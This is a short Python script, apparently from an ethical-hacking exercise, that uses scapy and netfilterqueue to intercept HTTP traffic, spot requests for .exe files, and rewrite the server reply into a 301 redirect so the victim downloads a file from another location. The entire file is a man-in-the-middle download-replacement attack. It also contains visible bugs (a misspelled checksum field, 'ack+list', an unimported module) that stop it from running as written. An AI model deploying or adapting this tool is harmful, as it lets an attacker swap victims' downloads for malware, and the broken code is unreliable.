#!/usr/bin/python

import scapy.all as scapy 

ack_list = []

def set_load(packet, load):
	packet[scapy.Raw].load = load 
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chsum 
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:
			if ".exe" in scapy_packet[scapy.Raw].load: 
				print("[+] exe Request")
				ack+list.append(scapy.packet[scapy.TCP].ack)
		elif scapy_packet[scapy.TCP].sport == 80:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("[+] Replacing file")
				modified_packet = set_load(scapy_packet, "HTTP/1.1 301 moved permanently\nLocation: exemple.web.com \n\n")

				packet.set_payload(str(modified_packet))

	packet.accept()			

	
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
